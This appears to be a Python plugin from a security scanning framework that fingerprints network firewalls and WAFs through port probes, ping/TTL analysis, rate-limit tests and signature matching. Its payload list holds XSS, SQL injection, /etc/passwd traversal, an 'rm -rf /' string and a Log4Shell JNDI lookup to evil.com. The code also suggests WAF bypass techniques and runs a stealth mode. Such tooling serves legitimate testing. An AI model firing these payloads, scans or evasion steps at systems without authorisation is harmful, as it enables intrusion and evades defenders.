"""
Plugin de Detecção de Firewall/WAF
Detecta presença e tipo de firewalls e WAFs
"""

import socket
import subprocess
import time
import random
import re
from typing import Dict, Any, List, Optional
import http.client
import urllib.parse

import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent))

from core.plugin_base import NetworkPlugin, PluginResult
from core.config import get_config


class FirewallDetectorPlugin(NetworkPlugin):
    """Plugin para detecção de firewalls e WAFs"""
    
    def __init__(self):
        super().__init__()
        self.description = "Detecta firewalls, WAFs e sistemas de proteção"
        self.version = "1.0.0"
        self.supported_targets = ["ip", "domain", "url"]
        
        # Configurações padrão
        self.timeout = 10
        self.max_retries = 3
        self.stealth_mode = True
        
        # Assinaturas de WAF conhecidos
        self.waf_signatures = {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id'],
                'cookies': ['__cfduid', '__cf_bm'],
                'responses': ['cloudflare', 'cf-ray'],
                'errors': ['cloudflare', 'attention required']
            },
            'aws_waf': {
                'headers': ['x-amzn-requestid', 'x-amz-cf-id'],
                'responses': ['aws', 'amazon'],
                'errors': ['blocked by aws']
            },
            'imperva': {
                'headers': ['x-iinfo'],
                'cookies': ['visid_incap', 'incap_ses'],
                'responses': ['imperva', 'incapsula'],
                'errors': ['request unsuccessful']
            },
            'f5_bigip': {
                'headers': ['f5-info', 'x-forwarded-for'],
                'cookies': ['BIGipServer', 'F5_fullWT'],
                'responses': ['f5', 'bigip'],
                'errors': ['the requested url was rejected']
            },
            'akamai': {
                'headers': ['akamai-ghost-ip', 'x-akamai-edgescape'],
                'responses': ['akamai', 'edgekey'],
                'errors': ['reference #']
            },
            'sucuri': {
                'headers': ['x-sucuri-id', 'x-sucuri-cache'],
                'responses': ['sucuri', 'cloudproxy'],
                'errors': ['access denied', 'sucuri']
            },
            'barracuda': {
                'headers': ['x-barracuda-url'],
                'responses': ['barracuda'],
                'errors': ['barracuda']
            },
            'fortinet': {
                'responses': ['fortigate', 'fortinet'],
                'errors': ['web page blocked']
            },
            'nginx_waf': {
                'headers': ['server: nginx'],
                'responses': ['nginx'],
                'errors': ['403 forbidden']
            }
        }
        
        # Payloads para teste de WAF
        self.waf_test_payloads = [
            '<script>alert("XSS")</script>',
            "' OR 1=1 --",
            '../../../../etc/passwd',
            'SELECT * FROM users',
            '<iframe src="javascript:alert()">',
            'exec("rm -rf /")',
            '${jndi:ldap://evil.com/a}',
            '../../etc/passwd%00',
            'javascript:alert(document.cookie)'
        ]
    
    def execute(self, target: str, context: Dict[str, Any], **kwargs) -> PluginResult:
        """Executa detecção de firewall/WAF"""
        start_time = time.time()
        
        try:
            # Ler configurações do YAML
            self.stealth_mode = get_config('plugins.config.FirewallDetectorPlugin.stealth_mode', True)
            self.max_retries = get_config('plugins.config.FirewallDetectorPlugin.max_retries', 3)
            detect_waf = get_config('plugins.config.FirewallDetectorPlugin.detect_waf', True)
            suggest_bypasses = get_config('plugins.config.FirewallDetectorPlugin.suggest_bypasses', True)
            
            # Preparar target
            hostname, port, is_https = self._parse_target(target)
            if not hostname:
                return PluginResult(
                    success=False,
                    plugin_name=self.name,
                    execution_time=time.time() - start_time,
                    data={},
                    error=f"Target inválido: {target}"
                )
            
            results = {
                'target': target,
                'hostname': hostname,
                'port': port,
                'is_https': is_https
            }
            
            hosts = []
            
            # Detecção de firewall de rede
            results['network_firewall'] = self._detect_network_firewall(hostname, port)
            
            # Detecção de WAF (Web Application Firewall)
            if detect_waf and (port in [80, 443, 8080, 8443] or is_https):
                results['waf_detection'] = self._detect_waf(hostname, port, is_https)
                
                # Teste de bypasses se WAF detectado
                if suggest_bypasses and results['waf_detection'].get('detected'):
                    results['bypass_suggestions'] = self._suggest_bypass_techniques(
                        hostname, port, is_https, results['waf_detection']
                    )
            
            # Análise de filtros de porta
            results['port_filtering'] = self._analyze_port_filtering(hostname)
            
            # Detecção de rate limiting
            results['rate_limiting'] = self._detect_rate_limiting(hostname, port, is_https)
            
            # Adicionar hostname aos hosts
            try:
                host_ip = socket.gethostbyname(hostname)
                hosts.append(host_ip)
            except:
                pass
            
            execution_time = time.time() - start_time
            
            return PluginResult(
                success=True,
                plugin_name=self.name,
                execution_time=execution_time,
                data={
                    **results,
                    'hosts': hosts
                }
            )
            
        except Exception as e:
            return PluginResult(
                success=False,
                plugin_name=self.name,
                execution_time=time.time() - start_time,
                data={},
                error=str(e)
            )
    
    def validate_target(self, target: str) -> bool:
        """Valida se o target é adequado para detecção de firewall"""
        hostname, port, is_https = self._parse_target(target)
        return hostname is not None
    
    def _parse_target(self, target: str) -> tuple[Optional[str], int, bool]:
        """Parseia target para extrair hostname, porta e protocolo"""
        try:
            # URL completa
            if target.startswith(('http://', 'https://')):
                parsed = urllib.parse.urlparse(target)
                hostname = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                is_https = parsed.scheme == 'https'
                return hostname, port, is_https
            
            # hostname:porta
            if ':' in target and not target.count(':') > 1:  # Evitar IPv6
                parts = target.split(':')
                if len(parts) == 2:
                    try:
                        port = int(parts[1])
                        hostname = parts[0]
                        is_https = port in [443, 8443]
                        return hostname, port, is_https
                    except ValueError:
                        pass
            
            # Hostname simples
            if '.' in target:
                return target, 80, False
            
            # IP
            try:
                socket.inet_aton(target)
                return target, 80, False
            except:
                pass
            
            return None, None, None
            
        except Exception:
            return None, None, None
    
    def _detect_network_firewall(self, hostname: str, port: int) -> Dict[str, Any]:
        """Detecta firewall de rede usando técnicas de fingerprinting"""
        try:
            detection_results = {
                'tcp_fingerprinting': self._tcp_fingerprinting(hostname, port),
                'icmp_analysis': self._icmp_analysis(hostname),
                'port_scan_detection': self._detect_port_scan_protection(hostname),
                'ttl_analysis': self._analyze_ttl_patterns(hostname)
            }
            
            # Análise geral
            firewall_indicators = 0
            indicators = []
            
            # Verificar indicadores de firewall
            tcp_fp = detection_results.get('tcp_fingerprinting', {})
            if tcp_fp.get('filtered_ports', 0) > 0:
                firewall_indicators += 1
                indicators.append('Portas filtradas detectadas')
            
            if tcp_fp.get('stealth_scan_detected', False):
                firewall_indicators += 1
                indicators.append('Detecção de stealth scan')
            
            icmp_analysis = detection_results.get('icmp_analysis', {})
            if icmp_analysis.get('icmp_filtered', False):
                firewall_indicators += 1
                indicators.append('ICMP filtrado')
            
            # Determinar probabilidade de firewall
            if firewall_indicators >= 2:
                likelihood = 'high'
            elif firewall_indicators == 1:
                likelihood = 'medium'
            else:
                likelihood = 'low'
            
            detection_results['summary'] = {
                'firewall_detected': firewall_indicators > 0,
                'likelihood': likelihood,
                'indicators': indicators,
                'indicator_count': firewall_indicators
            }
            
            return detection_results
            
        except Exception as e:
            return {'error': str(e)}
    
    def _detect_waf(self, hostname: str, port: int, is_https: bool) -> Dict[str, Any]:
        """Detecta Web Application Firewall"""
        try:
            # Fazer requisição normal primeiro
            normal_response = self._make_http_request(hostname, port, is_https, '/')
            
            # Testar com payloads maliciosos
            waf_responses = []
            detected_wafs = []
            
            for payload in self.waf_test_payloads[:5]:  # Limitar testes para stealth
                test_path = f'/?test={urllib.parse.quote(payload)}'
                response = self._make_http_request(hostname, port, is_https, test_path)
                
                if response:
                    waf_responses.append({
                        'payload': payload,
                        'status_code': response.get('status_code'),
                        'headers': response.get('headers', {}),
                        'body_snippet': response.get('body', '')[:200],
                        'blocked': response.get('status_code') in [403, 406, 429, 503]
                    })
                    
                    # Verificar assinaturas de WAF
                    detected_waf = self._identify_waf_from_response(response)
                    if detected_waf:
                        detected_wafs.append(detected_waf)
                
                # Delay para evitar rate limiting
                if self.stealth_mode:
                    time.sleep(random.uniform(1, 3))
            
            # Análise de cabeçalhos da resposta normal
            header_analysis = self._analyze_security_headers(normal_response)
            
            # Remover duplicatas de WAFs detectados
            detected_wafs = list(set(detected_wafs))
            
            return {
                'detected': len(detected_wafs) > 0 or any(r.get('blocked') for r in waf_responses),
                'identified_wafs': detected_wafs,
                'test_results': waf_responses,
                'header_analysis': header_analysis,
                'blocking_behavior': self._analyze_blocking_behavior(waf_responses),
                'confidence': self._calculate_waf_confidence(detected_wafs, waf_responses)
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _suggest_bypass_techniques(self, hostname: str, port: int, is_https: bool, waf_detection: Dict) -> Dict[str, Any]:
        """Sugere técnicas de bypass baseadas no WAF detectado"""
        try:
            identified_wafs = waf_detection.get('identified_wafs', [])
            
            bypass_suggestions = {
                'general_techniques': [
                    'Encoding variations (URL, HTML, Unicode)',
                    'Case variation attacks',
                    'Parameter pollution',
                    'HTTP verb tampering',
                    'Content-Type manipulation',
                    'Request splitting',
                    'IP whitelisting bypass'
                ],
                'specific_bypasses': {},
                'evasion_payloads': []
            }
            
            # Técnicas específicas por WAF
            for waf in identified_wafs:
                if waf == 'cloudflare':
                    bypass_suggestions['specific_bypasses']['cloudflare'] = [
                        'Use real client IP headers',
                        'Try different TLS/SSL versions',
                        'Use IPv6 if available',
                        'Fragment requests across multiple connections'
                    ]
                elif waf == 'aws_waf':
                    bypass_suggestions['specific_bypasses']['aws_waf'] = [
                        'Rate limiting evasion',
                        'Geographic IP rotation',
                        'Request size manipulation'
                    ]
                elif waf == 'imperva':
                    bypass_suggestions['specific_bypasses']['imperva'] = [
                        'Cookie manipulation',
                        'Session-based evasion',
                        'JavaScript challenge bypass'
                    ]
            
            # Payloads de evasão básicos
            bypass_suggestions['evasion_payloads'] = [
                'Concatenated strings',
                'Comment-based evasion',
                'Encoding variations',
                'Whitespace manipulation'
            ]
            
            return bypass_suggestions
            
        except Exception as e:
            return {'error': str(e)}
    
    def _analyze_port_filtering(self, hostname: str) -> Dict[str, Any]:
        """Analisa filtragem de portas"""
        try:
            test_ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 993, 995, 3389, 5900]
            
            port_results = {}
            open_ports = 0
            filtered_ports = 0
            closed_ports = 0
            
            for port in test_ports:
                result = self._test_port_connectivity(hostname, port)
                port_results[port] = result
                
                if result == 'open':
                    open_ports += 1
                elif result == 'filtered':
                    filtered_ports += 1
                else:
                    closed_ports += 1
            
            return {
                'tested_ports': test_ports,
                'port_results': port_results,
                'summary': {
                    'open_ports': open_ports,
                    'filtered_ports': filtered_ports,
                    'closed_ports': closed_ports,
                    'filtering_detected': filtered_ports > 0
                }
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _detect_rate_limiting(self, hostname: str, port: int, is_https: bool) -> Dict[str, Any]:
        """Detecta rate limiting"""
        try:
            # Fazer várias requisições rápidas
            responses = []
            
            for i in range(10):
                response = self._make_http_request(hostname, port, is_https, f'/test{i}')
                if response:
                    responses.append({
                        'request_num': i + 1,
                        'status_code': response.get('status_code'),
                        'response_time': response.get('response_time', 0)
                    })
                
                # Pequeno delay
                time.sleep(0.1)
            
            # Analisar padrões de rate limiting
            rate_limited = False
            rate_limit_status_codes = [429, 503, 509]
            
            # Verificar se houve códigos de rate limiting
            for response in responses:
                if response.get('status_code') in rate_limit_status_codes:
                    rate_limited = True
                    break
            
            # Analisar tempo de resposta
            response_times = [r.get('response_time', 0) for r in responses if r.get('response_time')]
            avg_response_time = sum(response_times) / len(response_times) if response_times else 0
            
            return {
                'rate_limiting_detected': rate_limited,
                'responses': responses,
                'average_response_time': avg_response_time,
                'analysis': 'Rate limiting analysis based on response codes and timing'
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    # Métodos auxiliares de detecção
    
    def _tcp_fingerprinting(self, hostname: str, port: int) -> Dict[str, Any]:
        """Fingerprinting TCP para detectar firewall"""
        try:
            # Teste de conectividade básica
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            try:
                result = sock.connect_ex((hostname, port))
                if result == 0:
                    # Conexão bem-sucedida
                    return {
                        'connection_status': 'open',
                        'filtered_ports': 0,
                        'stealth_scan_detected': False
                    }
                else:
                    # Conexão rejeitada
                    return {
                        'connection_status': 'closed_or_filtered',
                        'filtered_ports': 1,
                        'stealth_scan_detected': False
                    }
            finally:
                sock.close()
                
        except socket.timeout:
            return {
                'connection_status': 'filtered',
                'filtered_ports': 1,
                'stealth_scan_detected': True
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _icmp_analysis(self, hostname: str) -> Dict[str, Any]:
        """Análise ICMP para detectar filtragem"""
        try:
            # Teste de ping
            result = subprocess.run(
                ['ping', '-c', '3', '-W', '3', hostname],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                # Ping bem-sucedido
                return {
                    'icmp_response': True,
                    'icmp_filtered': False,
                    'ping_output': result.stdout
                }
            else:
                # Ping falhou
                return {
                    'icmp_response': False,
                    'icmp_filtered': True,
                    'ping_output': result.stderr
                }
                
        except subprocess.TimeoutExpired:
            return {
                'icmp_response': False,
                'icmp_filtered': True,
                'error': 'Ping timeout'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _detect_port_scan_protection(self, hostname: str) -> Dict[str, Any]:
        """Detecta proteção contra port scanning"""
        try:
            # Tentar scan rápido de várias portas
            test_ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445]
            
            start_time = time.time()
            connections = []
            
            for port in test_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                try:
                    result = sock.connect_ex((hostname, port))
                    connections.append((port, result == 0))
                except:
                    connections.append((port, False))
                finally:
                    sock.close()
            
            scan_time = time.time() - start_time
            
            # Análise do comportamento
            open_ports = sum(1 for _, is_open in connections if is_open)
            
            return {
                'scan_time': scan_time,
                'ports_scanned': len(test_ports),
                'open_ports': open_ports,
                'protection_detected': scan_time > 30 or open_ports == 0,
                'connections': connections
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _analyze_ttl_patterns(self, hostname: str) -> Dict[str, Any]:
        """Analisa padrões de TTL"""
        try:
            result = subprocess.run(
                ['ping', '-c', '5', hostname],
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.returncode == 0:
                # Extrair valores de TTL
                ttl_values = re.findall(r'ttl=(\d+)', result.stdout)
                ttl_values = [int(ttl) for ttl in ttl_values]
                
                if ttl_values:
                    avg_ttl = sum(ttl_values) / len(ttl_values)
                    ttl_variation = max(ttl_values) - min(ttl_values)
                    
                    return {
                        'ttl_values': ttl_values,
                        'average_ttl': avg_ttl,
                        'ttl_variation': ttl_variation,
                        'consistent_ttl': ttl_variation == 0
                    }
            
            return {'ttl_analysis': 'Unable to extract TTL values'}
            
        except Exception as e:
            return {'error': str(e)}
    
    def _make_http_request(self, hostname: str, port: int, is_https: bool, path: str) -> Optional[Dict[str, Any]]:
        """Faz requisição HTTP/HTTPS"""
        try:
            start_time = time.time()
            
            if is_https:
                conn = http.client.HTTPSConnection(hostname, port, timeout=self.timeout)
            else:
                conn = http.client.HTTPConnection(hostname, port, timeout=self.timeout)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            conn.request("GET", path, headers=headers)
            response = conn.getresponse()
            
            response_time = time.time() - start_time
            body = response.read().decode('utf-8', errors='ignore')
            
            # Capturar cabeçalhos
            response_headers = {}
            for header, value in response.getheaders():
                response_headers[header.lower()] = value
            
            result = {
                'status_code': response.status,
                'headers': response_headers,
                'body': body,
                'response_time': response_time
            }
            
            conn.close()
            return result
            
        except Exception as e:
            return None
    
    def _identify_waf_from_response(self, response: Dict[str, Any]) -> Optional[str]:
        """Identifica WAF baseado na resposta"""
        if not response:
            return None
        
        headers = response.get('headers', {})
        body = response.get('body', '').lower()
        
        for waf_name, signatures in self.waf_signatures.items():
            # Verificar cabeçalhos
            for header in signatures.get('headers', []):
                if header.lower() in headers:
                    return waf_name
            
            # Verificar cookies
            set_cookie = headers.get('set-cookie', '')
            for cookie in signatures.get('cookies', []):
                if cookie.lower() in set_cookie.lower():
                    return waf_name
            
            # Verificar corpo da resposta
            for response_sig in signatures.get('responses', []):
                if response_sig.lower() in body:
                    return waf_name
            
            # Verificar mensagens de erro
            for error_sig in signatures.get('errors', []):
                if error_sig.lower() in body:
                    return waf_name
        
        return None
    
    def _analyze_security_headers(self, response: Optional[Dict[str, Any]]) -> Dict[str, Any]:
        """Analisa cabeçalhos de segurança"""
        if not response:
            return {'error': 'No response to analyze'}
        
        headers = response.get('headers', {})
        
        security_headers = {
            'strict-transport-security': headers.get('strict-transport-security'),
            'content-security-policy': headers.get('content-security-policy'),
            'x-frame-options': headers.get('x-frame-options'),
            'x-xss-protection': headers.get('x-xss-protection'),
            'x-content-type-options': headers.get('x-content-type-options'),
            'server': headers.get('server'),
            'x-powered-by': headers.get('x-powered-by')
        }
        
        # Filtrar cabeçalhos presentes
        present_headers = {k: v for k, v in security_headers.items() if v is not None}
        
        return {
            'security_headers': present_headers,
            'header_count': len(present_headers),
            'security_score': len(present_headers)  # Score básico baseado na quantidade
        }
    
    def _analyze_blocking_behavior(self, responses: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analisa comportamento de bloqueio"""
        if not responses:
            return {'error': 'No responses to analyze'}
        
        blocked_count = sum(1 for r in responses if r.get('blocked', False))
        total_requests = len(responses)
        
        blocking_patterns = []
        status_codes = [r.get('status_code') for r in responses]
        
        # Analisar padrões de status code
        if 403 in status_codes:
            blocking_patterns.append('403 Forbidden responses')
        if 406 in status_codes:
            blocking_patterns.append('406 Not Acceptable responses')
        if 429 in status_codes:
            blocking_patterns.append('429 Too Many Requests')
        
        return {
            'blocked_requests': blocked_count,
            'total_requests': total_requests,
            'blocking_rate': blocked_count / total_requests if total_requests > 0 else 0,
            'blocking_patterns': blocking_patterns,
            'aggressive_blocking': blocked_count > total_requests * 0.5
        }
    
    def _calculate_waf_confidence(self, detected_wafs: List[str], responses: List[Dict[str, Any]]) -> str:
        """Calcula confiança na detecção de WAF"""
        confidence_score = 0
        
        # Pontos por WAFs identificados
        confidence_score += len(detected_wafs) * 30
        
        # Pontos por requisições bloqueadas
        blocked_requests = sum(1 for r in responses if r.get('blocked', False))
        confidence_score += blocked_requests * 15
        
        # Determinar nível de confiança
        if confidence_score >= 70:
            return 'high'
        elif confidence_score >= 40:
            return 'medium'
        else:
            return 'low'
    
    def _test_port_connectivity(self, hostname: str, port: int) -> str:
        """Testa conectividade de uma porta"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            result = sock.connect_ex((hostname, port))
            
            if result == 0:
                return 'open'
            else:
                return 'closed'
                
        except socket.timeout:
            return 'filtered'
        except Exception:
            return 'filtered'
        finally:
            try:
                sock.close()
            except:
                pass
